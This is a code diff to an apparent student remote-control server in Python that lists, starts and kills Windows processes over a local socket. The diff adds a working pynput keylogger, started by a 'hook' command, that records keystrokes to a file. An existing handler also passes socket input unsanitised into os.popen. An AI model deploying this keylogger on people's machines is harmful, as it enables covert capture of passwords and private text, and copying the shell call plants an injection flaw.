@@ -5,6 +5,8 @@ import os
 import winreg
 import psutil
 import subprocess
+import pynput
+from pynput import keyboard
 
 HOST = "127.0.0.1"
 PORT = 65432
@@ -33,6 +35,18 @@ typeDic = {
     "DWORD": winreg.REG_DWORD,
     "QWORD": winreg.REG_QWORD,
 }
+
+
+def on_press(key):
+    try:
+        f.write(str(key.char))
+    except AttributeError:
+        if(key == keyboard.Key.space):
+            key = " "
+        if(key == keyboard.Key.enter):
+            key = "<enter>\n"
+        f.write(str(key))
+
 
 try:
     print("Connected by ", addr)
@@ -157,13 +171,13 @@ try:
                 res = str(pro.name().replace('.exe', '')) + "__" + \
                     str(pro.pid) + "__" + str(pro.num_threads())
                 res_final.append(res)
-                #check_recv = conn.recv(1024)
+                # check_recv = conn.recv(1024)
             str_send = "_a_".join(res_final)
             conn.sendall(bytes(str_send, "utf8"))
         elif encodedData == "kill_process":
             ID_str = conn.recv(1024).decode("utf8")
             ID_kill = int(ID_str)
-            #print(ID_kill, " da chuyen")
+            # print(ID_kill, " da chuyen")
             check_kill_comp = False
             for pro in psutil.process_iter():
                 if pro.pid == ID_kill:
@@ -176,7 +190,7 @@ try:
                 conn.sendall(bytes("kill_fail", "utf8"))
         elif encodedData == "start_app" or encodedData == "start_process":
             Name_start = conn.recv(1024).decode("utf8")
-            os.popen("start "+ Name_start)
+            os.popen("start " + Name_start)
             check_start = False
             cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName,Id'
             proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
@@ -191,7 +205,7 @@ try:
                 Name_res.append(
                     text[0:text.find(" ", 0, len(text))].strip(" "))
             for pro in psutil.process_iter():
-                if(pro.name().replace('.exe','')==Name_start and pro.name().replace('.exe','') in Name_res):
+                if(pro.name().replace('.exe', '') == Name_start and pro.name().replace('.exe', '') in Name_res):
                     check_start = True
                     break
             if (check_start):
@@ -212,7 +226,7 @@ try:
             res = res[2:]
             ID_res = []
             for text in res:
-                #print(text[0:text.find(" ",0,len(text))])
+                # print(text[0:text.find(" ",0,len(text))])
                 ID_res.append(
                     int(text[text.find(" ", 0, len(text)):len(text)].strip(" ")))
             res_final = []
@@ -222,7 +236,7 @@ try:
                     res = str(pro.name().replace('.exe', '')) + "__" + \
                         str(pro.pid) + "__" + str(pro.num_threads())
                     res_final.append(res)
-                #check_recv = conn.recv(1024)
+                # check_recv = conn.recv(1024)
             str_send = "_a_".join(res_final)
             conn.sendall(bytes(str_send, "utf8"))
         elif encodedData == "kill_app":
@@ -239,12 +253,12 @@ try:
             res = res[2:]
             ID_res = []
             for text in res:
-                #print(text[0:text.find(" ",0,len(text))])
+                # print(text[0:text.find(" ",0,len(text))])
                 ID_res.append(
                     int(text[text.find(" ", 0, len(text)):len(text)].strip(" ")))
             ID_str = conn.recv(1024).decode("utf8")
             ID_kill = int(ID_str)
-            #print(ID_kill, " da chuyen")
+            # print(ID_kill, " da chuyen")
             if ID_kill in ID_res:
                 check_kill_comp = False
                 for pro in psutil.process_iter():
@@ -260,9 +274,18 @@ try:
                 conn.sendall(bytes("kill_fail", "utf8"))
 
         elif encodedData == "hook":
-            continue
-        elif encodedData == "unhook":
-            continue
+            f = open("keylog.txt", "w", encoding="utf8")  # ghi đè lên hết
+            f.seek(0)
+            listener = pynput.keyboard.Listener(on_press=on_press)
+            listener.start()
+            # bắt đầu thread theo dõi
+            data = conn.recv(1024).decode("utf8")
+            # khi nào nhận đc lệnh unhook
+            if data == "unhook":
+                listener.stop()
+                listener.join()
+                f.truncate()
+                f.close()
         elif encodedData == "printkey":
             continue
 
